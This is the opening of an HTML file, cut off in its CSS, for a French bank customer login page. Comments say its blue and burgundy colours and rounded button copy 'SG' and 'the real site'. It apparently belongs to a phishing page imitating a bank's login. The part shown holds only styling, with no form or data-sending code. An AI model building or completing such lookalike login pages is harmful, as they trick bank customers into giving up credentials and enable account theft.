<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion - Espace Client Particuliers</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #ffffff; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .header {
            text-align: left;
            margin-bottom: 40px;
            padding-left: 10px;
        }
        h1 {
            font-size: 18px;
            font-weight: 600;
            color: #0065a8; /* Bleu SG pour le titre */
            margin: 0;
            line-height: 1.3;
        }
        .form-group {
            margin-bottom: 20px;
            padding-left: 10px;
        }
        label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 8px;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
            color: #333;
            background: transparent;
            outline: none;
            transition: border-color 0.3s;
        }
        /* Changement de couleur au clic (Bleu SG) */
        input[type="text"]:focus, input[type="password"]:focus, input[type="email"]:focus {
            border-bottom: 2px solid #0065a8;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0 30px 10px;
            font-size: 13px;
            color: #333;
        }
        .checkbox-group input {
            margin-right: 8px;
            width: 16px;
            height: 16px;
            accent-color: #0065a8;
        }
        /* Bouton Rouge/Bordeaux comme sur le vrai site */
        .btn-connect {
            width: 100%;
            padding: 14px;
            background-color: #a0001e; /* Rouge/Bordeaux SG */
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-left: 10px;
            margin-right: 10px;
            transition: background 0.3s;
            box-shadow: 0 2px 5px rgba(160, 0, 30, 0.3);
        }
        .btn-connect:hover {
            background-color: #800018;
        }
        .footer-links {
            margin-top: 30px;
            text-align: left;
            padding-left: 10px;
            font-size: 12px;
            color: #666;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
        .footer-links a {
            color: #a0001e; /* Liens en rouge/bordeaux */
            text-decoration: none;
            margin-right: 10px;
        }
        /* Logo en bas à gauche, petit et discret */
        .footer-logo {
            position: absolute;
            bottom: 20px;
            left: 20px;
            opacity: 0.7;
        }
        .footer-logo img {
            width: 80px;
        }
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #a0001e; /* Rouge pour le chargement */
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin
